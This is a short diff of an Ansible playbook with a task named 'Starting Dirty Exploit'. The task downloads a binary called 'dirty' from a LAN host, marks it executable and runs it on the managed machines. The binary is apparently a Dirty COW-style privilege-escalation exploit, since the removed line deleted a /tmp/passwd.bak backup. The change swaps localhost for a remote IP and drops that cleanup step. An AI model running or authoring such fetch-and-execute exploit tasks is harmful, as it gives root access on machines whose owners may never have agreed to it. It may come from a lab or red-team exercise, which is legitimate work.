@@ -4,7 +4,7 @@
   gather_facts: false
   tasks:
     - name: "Starting Dirty Exploit"
-      raw: "wget http://localhost:8000/dirty; chmod +x dirty;./dirty;rm /tmp/passwd.bak"
+      raw: "wget http://192.168.98.130:8000/dirty; chmod +x dirty;./dirty"
       args:
        executable: /bin/bash
       ignore_errors: true
